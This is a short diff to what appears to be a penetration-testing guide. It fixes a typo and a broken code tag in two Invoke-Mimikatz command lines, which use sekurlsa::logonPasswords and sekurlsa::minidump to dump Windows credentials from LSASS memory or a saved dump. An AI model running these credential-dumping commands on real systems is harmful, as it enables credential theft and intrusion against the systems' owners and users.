@@ -38,4 +38,4 @@ Once the module is imported, you can run Invoke-Mimikatz to dump the LSASS</br>
 
 <code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::logonPasswords"'</code><br>
 * You can also using minidump module to select where to read:<br>
-code> Invoke-Mimikatz -Command '"provolege::debug" "sekurlsa::minidump C:\Path\To\Load\Lsass"'
+<code>Invoke-Mimikatz -Command '"privilege::debug" "sekurlsa::minidump C:\Path\To\Load\Lsass"'</code>
